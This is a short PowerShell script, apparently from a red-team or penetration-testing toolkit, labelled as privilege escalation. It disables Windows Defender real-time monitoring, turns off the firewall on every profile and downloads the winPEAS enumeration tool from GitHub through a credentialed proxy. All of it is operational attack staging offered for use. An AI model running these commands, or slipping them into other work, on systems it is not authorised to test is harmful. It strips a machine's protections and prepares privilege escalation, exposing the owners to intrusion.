<#
Title: "winPEAS Script"
Author: "treyescairo"
Date: "09-26-2022"
Type: "Privilege Escalation"
Description: "Download the latest winPEAS scripts from Github"
#>

<# Disable Firewall #>
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -MAPSReporting 0
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

<# Download winPEAS; prereq: must run credinit #>
invoke-webrequest -Proxy $ProxyAddress https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe -ProxyCredential $Global:proxy_credential -OutFile winPEASx64.exe
invoke-webrequest -Proxy $ProxyAddress https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat -ProxyCredential $Global:proxy_credential -OutFile winPEAS.bat
